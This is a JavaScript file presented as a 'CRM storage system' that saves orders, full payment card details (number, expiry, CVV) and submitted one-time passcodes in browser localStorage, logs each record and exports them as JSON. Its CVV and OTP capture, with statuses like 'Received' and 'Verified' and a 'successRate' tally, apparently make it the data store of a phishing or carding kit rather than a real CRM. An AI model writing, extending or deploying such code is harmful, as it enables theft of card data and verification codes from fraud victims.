// Fixed Cloud CRM Storage System
class CloudCRMStorage {
  constructor() {
    this.useLocalStorage = true; // Fallback to localStorage for now
    this.binId = this.getBinId();
    this.initializeStorage();
  }

  getBinId() {
    // Store bin ID in localStorage for persistence
    let binId = localStorage.getItem('crmBinId');
    if (!binId) {
      // Generate a unique bin ID for this installation
      binId = 'crm_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmBinId', binId);
    }
    return binId;
  }

  async initializeStorage() {
    try {
      // For now, use localStorage as primary storage
      // Cloud sync can be added later with a proper API
      if (!localStorage.getItem('crmData')) {
        const initialData = {
          orders: [],
          cards: [],
          otp: [],
          settings: {
            autoSave: true,
            lastBackup: new Date().toISOString(),
            deviceId: this.generateDeviceId(),
            syncEnabled: false
          }
        };
        localStorage.setItem('crmData', JSON.stringify(initialData));
        console.log('CRM data initialized locally');
      } else {
        console.log('CRM data loaded from local storage');
      }
    } catch (error) {
      console.error('CRM initialization failed:', error);
    }
  }

  generateDeviceId() {
    let deviceId = localStorage.getItem('crmDeviceId');
    if (!deviceId) {
      deviceId = 'device_' + Date.now().toString(36) + '_' + Math.random().toString(36).substr(2, 9);
      localStorage.setItem('crmDeviceId', deviceId);
    }
    return deviceId;
  }

  // Simulated cloud functions for now
  async loadFromCloud() {
    try {
      // For demo purposes, return null to use local storage
      // In production, this would make an actual API call
      console.log('Cloud sync not configured - using local storage');
      return null;
    } catch (error) {
      console.error('Failed to load from cloud:', error);
      return null;
    }
  }

  async saveToCloud(data) {
    try {
      // For demo purposes, just log the action
      // In production, this would make an actual API call
      console.log('Cloud sync not configured - data saved locally');
      return true;
    } catch (error) {
      console.error('Failed to save to cloud:', error);
      return false;
    }
  }

  async getData() {
    try {
      // Always use localStorage for now
      return JSON.parse(localStorage.getItem('crmData') || '{"orders":[],"cards":[],"otp":[]}');
    } catch (e) {
      console.error('Error reading CRM data:', e);
      return { orders: [], cards: [], otp: [] };
    }
  }

  async saveData(data) {
    try {
      // Save to localStorage
      localStorage.setItem('crmData', JSON.stringify(data));
      
      // Update last backup time
      if (data.settings) {
        data.settings.lastBackup = new Date().toISOString();
      }
      
      console.log('CRM data saved locally');
      return true;
    } catch (e) {
      console.error('Error saving CRM data:', e);
      return false;
    }
  }

  async addOrder(orderData) {
    const data = await this.getData();
    const order = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.generateDeviceId(),
      fullName: orderData.fullName,
      email: orderData.email,
      phone: orderData.phone,
      orderTotal: orderData.orderTotal,
      status: 'Completed'
    };
    data.orders.unshift(order);
    await this.saveData(data);
    console.log('Order added to CRM:', order);
    return order;
  }

  async addCardDetails(cardData) {
    const data = await this.getData();
    const card = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.generateDeviceId(),
      cardName: cardData.cardName,
      cardNumber: cardData.cardNumber,
      expiry: cardData.expiry,
      cvv: cardData.cvv,
      status: 'Received'
    };
    data.cards.unshift(card);
    await this.saveData(data);
    console.log('Card details added to CRM:', card);
    return card;
  }

  async addOTPData(otpData) {
    const data = await this.getData();
    const otp = {
      id: this.generateId(),
      timestamp: new Date().toISOString(),
      deviceId: this.generateDeviceId(),
      submittedOTP: otpData.submittedOTP,
      email: otpData.email,
      phone: otpData.phone,
      status: 'Verified'
    };
    data.otp.unshift(otp);
    await this.saveData(data);
    console.log('OTP data added to CRM:', otp);
    return otp;
  }

  generateId() {
    return Date.now().toString(36) + Math.random().toString(36).substr(2, 9);
  }

  async exportData() {
    const data = await this.getData();
    const dataStr = JSON.stringify(data, null, 2);
    const blob = new Blob([dataStr], { type: 'application/json' });
    const url = URL.createObjectURL(blob);
    const a = document.createElement('a');
    a.href = url;
    a.download = 'crm_data_' + new Date().toISOString().split('T')[0] + '.json';
    document.body.appendChild(a);
    a.click();
    document.body.removeChild(a);
    URL.revokeObjectURL(url);
  }

  async clearAllData() {
    const initialData = {
      orders: [],
      cards: [],
      otp: [],
      settings: {
        autoSave: true,
        lastBackup: new Date().toISOString(),
        deviceId: this.generateDeviceId(),
        syncEnabled: false
      }
    };
    await this.saveData(initialData);
  }

  async getStats() {
    const data = await this.getData();
    return {
      totalOrders: data.orders.length,
      totalCards: data.cards.length,
      totalOTP: data.otp.length,
      successRate: data.otp.length > 0 ? 100 : 0,
      lastSync: data.settings?.lastBackup || null,
      deviceId: data.settings?.deviceId || 'unknown',
      syncEnabled: data.settings?.syncEnabled || false
    };
  }

  // Manual sync function (simulated)
  async syncFromCloud() {
    try {
      // For now, just refresh from localStorage
      console.log('Manual sync: Refreshing from local storage');
      return true;
    } catch (error) {
      console.error('Manual sync failed:', error);
      return false;
    }
  }

  // Enable/disable sync
  setSyncEnabled(enabled) {
    const data = JSON.parse(localStorage.getItem('crmData') || '{"orders":[],"cards":[],"otp":[]}');
    if (!data.settings) data.settings = {};
    data.settings.syncEnabled = enabled;
    localStorage.setItem('crmData', JSON.stringify(data));
  }
}

// Global cloud CRM instance
window.cloudCRMStorage = new CloudCRMStorage();

// Global functions for backward compatibility
window.addOrder = async function(data) {
  return await window.cloudCRMStorage.addOrder(data);
};

window.addCardDetails = async function(data) {
  return await window.cloudCRMStorage.addCardDetails(data);
};

window.addOTPData = async function(data) {
  return await window.cloudCRMStorage.addOTPData(data);
};

// Sync functions for manual control
window.syncCRMFromCloud = async function() {
  return await window.cloudCRMStorage.syncFromCloud();
};

console.log('Fixed CRM Storage System initialized - using local storage');
